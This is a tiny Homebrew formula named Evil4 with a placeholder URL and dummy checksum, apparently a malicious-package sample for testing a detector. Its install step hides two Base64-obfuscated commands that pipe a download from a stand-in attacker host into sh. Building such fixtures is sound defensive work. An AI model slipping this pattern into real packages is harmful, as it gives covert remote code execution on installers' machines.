class Evil4 < Formula
  url "https://example.com/evil4-1.0.tar.gz"
  sha256 "4444444444444444444444444444444444444444444444444444444444444444"
  def install
    eval(Base64.decode64("c3lzdGVtKCJjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlIHwgc2giKQ=="))
    system "echo Y3VybCBldmlsIHwgc2g= | base64 -d | sh"
  end
end
